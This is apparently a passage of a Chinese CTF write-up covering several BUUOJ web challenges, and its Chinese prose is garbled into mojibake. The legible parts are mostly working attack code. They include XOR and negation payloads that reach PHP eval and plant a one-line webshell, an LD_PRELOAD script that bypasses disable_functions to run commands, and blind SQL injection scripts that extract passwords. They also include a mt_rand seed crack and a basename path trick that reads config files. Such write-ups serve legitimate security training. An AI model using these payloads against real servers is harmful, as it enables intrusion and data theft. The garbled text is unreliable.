src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133335204.png" alt="image-20210916133335204"></p><p>postä¸€ä¸ªmerakå€¼ï¼Œå¾—åˆ°ä¸€æ®µä»£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133404217.png" alt="image-20210916133404217"></p><p>ä»£ç å®¡è®¡</p><p>è¦æ±‚getè¿›ä¸€ä¸ªå€¼ä¸”å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åä¸ºè¿™ä¸ªå€¼çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºtodat is a happy day</p><p>å¯ä»¥ç”¨data://text/plain,ç»•è¿‡</p><p>ä¹Ÿå¯ä»¥ç”¨data:<em>//text/plain;base64,</em></p><p>ç„¶åå­˜åœ¨ä¸€ä¸ªfile_get_contentsè¯»å–ä¼ å…¥çš„file</p><p>è¦è®©è¿™ä¸ªå€¼ç»è¿‡changeå‡½æ•°åä¸ºflag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133828755.png" alt="image-20210916133828755"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133839192.png" alt="image-20210916133839192"></p><p>ä¼ è¿›å»ï¼Œæ‹¿flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code&#x3D;$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;&#x2F;&#x2F; ?&gt;</code></pre><p>æœ‰evalå‡½æ•°ï¼Œè¦è¯•å›¾å‘½ä»¤æ‰§è¡Œï¼Œç„¶åpreg_matchè¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å¼‚æˆ–æˆ–è€…æ˜¯urlç¼–ç å–åæ¥ç»•è¿‡</p><p>å–å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182257977.png" alt="image-20210918182257977"></p><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182348259.png" alt="image-20210918182348259"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¦ç”¨çš„å‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182433498.png" alt="image-20210918182433498"></p><p>æˆ–è€…åˆ©ç”¨å¼‚æˆ–</p><pre class="language-none"><code class="language-none">code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183044112.png" alt="image-20210918183044112"></p><p>ä¸€æ ·å¯ä»¥è¿›å…¥phpinfoé¡µé¢</p><p>æŸ¥çœ‹åˆ°ç¦ç”¨çš„å‡½æ•°åå¯ä»¥å°è¯•åˆ©ç”¨å–åæˆ–è€…å¼‚æˆ–å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p>//æŠ„çš„payload</p><pre class="language-none"><code class="language-none">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  &#x2F;&#x2F;åˆ«å¿˜äº†åé¢çš„åˆ†å·æˆ–è€…ï¼š?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183814123.png" alt="image-20210918183814123"></p><p>ç„¶åèšå‰‘é“¾æ¥ï¼Œè¦æ‰§è¡Œè¯»å–flagçš„readflagäºŒè¿›åˆ¶æ–‡ä»¶æ‰èƒ½å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184148817.png" alt="image-20210918184148817"></p><p>ä½†æ˜¯</p><p>disable_functionsç¦ç”¨çš„å‡½æ•°å¤ªå¤šå¯¼è‡´shellä¸èƒ½æ‰§è¡Œå‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184324855.png" alt="image-20210918184324855"></p><p>è¿™é‡Œå¯ä»¥ç”¨èšå‰‘çš„æ’ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184419549.png" alt="image-20210918184419549"></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•</p><p>åˆ©ç”¨linuxæä¾›çš„LD_preloadç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒå…±äº«soï¼Œåœ¨å¯åŠ¨å­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ–°çš„å­è¿›ç¨‹ä¼šåŠ è½½æˆ‘ä»¬æ¶æ„çš„soæ‹“å±•ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨soé‡Œé¢å®šä¹‰åŒåå‡½æ•°ï¼Œå³å¯åŠ«æŒAPIè°ƒç”¨ï¼ŒæˆåŠŸRCE<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html">æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">EXPåœ°å€</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918194317240.png" alt="image-20210918194317240"></p><p>æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼</p><p>ä¸Šä¼ bypass.php</p><pre class="language-none"><code class="language-none">&lt;?php    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;;    $cmd &#x3D; $_GET[&quot;cmd&quot;];    $out_path &#x3D; $_GET[&quot;outpath&quot;];    $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;è®¾ç½®EVIL_CMDLINEç¯å¢ƒå˜é‡    $so_path &#x3D; $_GET[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path);  &#x2F;&#x2F;åŠ è½½æ¶æ„åŠ¨æ€åº“    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  &#x2F;&#x2F;åˆ©ç”¨mailå‡½æ•°è§¦å‘æ¶æ„å‡½æ•°ï¼Œè·³è½¬è‡³__attribute__ ((__constructor__))ä¿®é¥°çš„å‡½æ•°ã€‚    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;;     unlink($out_path);?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193756871.png" alt="image-20210918193756871"></p><p>æœ€ç»ˆpayload</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193729344.png" alt="image-20210918193729344"></p><p>å‚è€ƒé“¾æ¥</p><p><a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">bypass_disable_functions | 0xCreed (jxustctf.top)</a></p><p>[<a href="https://www.cnblogs.com/yesec/p/12483631.html">BUUOJè®°å½•] [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME - Ye&#39;sBlog - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105136633/">æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME_æœ«åˆ Â· mochu7-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEï¼ˆå–åã€å¼‚æˆ–ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ã€bypass disable_functionï¼‰_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_å¼‚æˆ–ç»•è¿‡</a></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223822994.png" alt="image-20210918223822994"></p><p>ä¸çŸ¥é“å¯†ç ï¼Œsqlæ³¨å…¥ä¹Ÿä¸æˆåŠŸ</p><p>ç›´æ¥æŠŠcookieæ”¹æˆusername=cookieå°±è¡Œäº†ï¼Œä¸æ¸…æ¥šè¿™é¢˜åœ¨è€ƒå•¥ã€‚ã€‚ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223845191.png" alt="image-20210918223845191"></p><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>å¸ƒå°”ç›²æ³¨ï¼Œè¿‡æ»¤äº†ç©ºæ ¼</p><p>(ascii(substr(database(),{},1))={})&quot;.format(i,j)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235150704.png" alt="image-20210918235150704"></p><p>(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={})</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918234900927.png" alt="image-20210918234900927"></p><p>(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={})</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235644493.png" alt="image-20210918235644493"></p><p>(ascii(substr((select(group_concat(value))from(flag))</p><p>è„šæœ¬ï¼š</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot;data &#x3D; &#39;&#39;k &#x3D; 0for i in range(13,50):    k &#x3D; 0    for j in range(43,127):        gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        res &#x3D; requests.get(url+gets)        if &quot;your score is: 100&quot; in res.text:            data +&#x3D; chr(j)            print(data)            k &#x3D; 1            break    if(k &#x3D;&#x3D; 0):        print(&quot;err!&quot;)        exit()    </code></pre><p>å› ä¸ºç½‘ç»œé—®é¢˜åŠ äº†åˆ¤æ–­ï¼Œç»“æœå°±æ˜¯è·‘ä¸€ä¼šå°±åœäº†ï¼Œåªèƒ½ä¸€æ®µä¸€æ®µçš„è·‘äº†</p><p>ä¸€å®šæ˜¯buu flagå¤ªé•¿äº†ï¼ˆ</p><p>ç®—æ˜¯ç¬¬ä¸€æ¬¡è‡ªå·±å†™è„šæœ¬äº†</p><p>éå†å±å®è·‘çš„å¤ªæ…¢äº†ï¼ŒæŠ½ç©ºå­¦ä¸€ä¸‹äºŒåˆ†æ³•çš„å†™æ³•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210919002507491.png" alt="image-20210919002507491"></p><p>flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4}</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134432965.png" alt="image-20210921134432965"></p><p>æ¶‰åŠäº†phpçš„ä¼ªéšæœº</p><p>å¦‚æœmt_srandä½¿ç”¨åŒä¸€ä¸ªseedï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯å¯ä»¥çˆ†ç ´å‡ºseedçš„</p><p>æŸ¥çœ‹æºç æ‰¾åˆ°check.php</p><pre class="language-php" data-language="php"><code class="language-php">pbEzqyRCJP&lt;?php#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show &#x3D; substr($str, 0, 10);echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x        echo &quot;&lt;p id&#x3D;flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id&#x3D;flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;&#x2F;p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;);</code></pre><p>çŸ¥é“å‰å‡ ä½äº†</p><p>æ ¹æ®ç”Ÿæˆç®—æ³•é€†å‘å‡ºæ»¡è¶³php_mt_seedå·¥å…·è¦æ±‚çš„å‚æ•°ï¼ˆç™¾åº¦æŠ„çš„</p><pre class="language-php" data-language="php"><code class="language-php">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2&#x3D;&#39;pbEzqyRCJP&#39;str3 &#x3D; str1[::-1]length &#x3D; len(str2)res&#x3D;&#39;&#39;for i in range(len(str2)):      for j in range(len(str1)):        if str2[i] &#x3D;&#x3D; str1[j]:            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)#15 15 0 61 1 1 0 61 40 40 0 61 25 25 0 61 16 16 0 61 24 24 0 61 53 53 0 61 38 38 0 61 45 45 0 61 51 51 0 61 </code></pre><p>æ”¾åˆ°php_mt_seedé‡Œè·‘ç§å­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134854213.png" alt="image-20210921134854213"></p><p>å†åˆ©ç”¨è¿™ä¸ªè„šæœ¬å¾—åˆ°æœ€åçš„å€¼</p><pre class="language-none"><code class="language-none">&lt;?phpmt_srand(499600072);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134936468.png" alt="image-20210921134936468"></p><p>åæ§½ä¸€ä¸‹ï¼Œå·¥ä¸šäº’è”ç½‘çš„æ—¶å€™çœ‹è§ä¸€ä¸ªç±»ä¼¼çš„é¢˜ï¼Œç…§ç€è¿™ä¸ªé¢˜çš„wpæ²¡è·‘å‡ºæ¥ï¼Œä»Šå¤©æ‰çŸ¥é“æ˜¯php_mt_seedçš„é—®é¢˜ï¼Œè™½ç„¶æ„Ÿè§‰å¾ˆç¦»è°±</p><p>å®˜ç½‘ä¸‹çš„çˆ†ä¸å‡ºseedï¼Œä»è¿™é‡Œä¸‹çš„å¯ä»¥<a href="https://download.openwall.net/pub/projects/php_mt_seed/">Index of /pub/projects/php_mt_seed (openwall.net)</a></p><p>è¿˜æœ‰å°±æ˜¯ä¸€æ ·çš„ç§å­åœ¨phpç‰ˆæœ¬ä¸ä¸€æ ·çš„æ—¶å€™å‡ºæ¥çš„å€¼ä¹Ÿä¸ä¸€æ ·</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921135243406.png" alt="image-20210921135243406"></p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess &#x3D; (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message &#x3D; &#39;Wrong.&#39;;  &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt;  &lt;&#x2F;head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt;    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt;    &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;    &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt;    &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;&lt;?php &#125; ?&gt;    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt;      &lt;input type&#x3D;&quot;submit&quot;&gt;    &lt;&#x2F;form&gt;  &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>è¿™é‡Œæˆ‘æœ¬æ¥ä»¥ä¸ºæ˜¯phpä¼ªéšæœºæ•°çš„æ¼æ´ï¼Œç»“æœæœ€åæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯basenameå‡½æ•°çš„æ¼æ´</p><p>å®ƒä¼šå¿½ç•¥åé¢çš„[\x80-\xff]èŒƒå›´å†…çš„å­—ç¬¦ä¸²ï¼Œå³éasciiå­—ç¬¦ã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\x80&quot;));&#39; &#x2F;&#x2F; config.phpphp -r &#39;print(basename(&quot;\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php</code></pre><p><strong>$_SERVER[â€˜PHP_SELFâ€™]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œå½“ä½¿ç”¨äº†PATH_INFOæ—¶ï¼Œè¿™ä¸ªå€¼æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥å°è¯•ç”¨/index.php/config.php/\x80?sourceæ¥è¯»å–flagã€‚</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021163516849.png" alt="image-20211021163516849"></p><h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p>æºç æ³„éœ²</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021165221385.png" alt="image-20211021165221385"></p><p>ä¸‹è½½image.php.bak</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &quot;config.php&quot;;$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id&#x3D;addslashes($id);$path&#x3D;addslashes($path);$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image&#x2F;jpeg&quot;);readfile($path);</code></pre><p>GETæ–¹å¼ä¼ å…¥å˜é‡idçš„å€¼ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸º1<br>GETæ–¹å¼ä¼ å…¥å˜é‡pathçš„å€¼ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸ºç©º<br>addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼Œå•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œæ ï¼ˆ\ï¼‰<br>str_replace()å‡½æ•°å°†ä¸¤ä¸ªå˜é‡å†…çš„\0ã€%00ã€&#39;ã€&#39;éƒ½æ›¿æ¢ä¸ºç©º<br>å°†å˜é‡$idä¸$pathæ‹¼æ¥è¿›SQLè¯­å¥<br>è„šæœ¬ï¼š</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\0&#39;&amp;path&#x3D;&quot;payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot;payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;database &#x3D; &quot;&quot;for i in range(1,1000):low &#x3D; 32high &#x3D; 128mid &#x3D; (low + high) &#x2F;&#x2F; 2while(low &lt; high):payload &#x3D; payload4.format(i,mid)new_url &#x3D; url + payloadr &#x3D; requests.get(new_url)if &quot;JFIF&quot; in r.text:low &#x3D; mid + 1else:high &#x3D; midmid &#x3D; (low + high) &#x2F;&#x2F; 2if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128):breakdatabase +&#x3D; chr(mid)print(database)</code></pre><p>å¾—åˆ°å¯†ç å’Œç”¨æˆ·åç™»å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180732197.png" alt="image-20211021180732197"></p><p>ç™»å½•åæ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180749445.png" alt="image-20211021180749445"></p><p>è¿™é‡Œè¦ç”¨æ–‡ä»¶åä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184513558.png" alt="image-20211021184513558"></p><p>åœ¨ä¸Šä¼ åçš„ç›®å½•å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶åä½†æ˜¯ä¸èƒ½è®¿é—®ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184345858.png" alt="image-20211021184345858"></p><p>ä¸èƒ½ç”¨phpå°±ç”¨çŸ­æ ‡ç­¾ä»£æ›¿</p><p><img 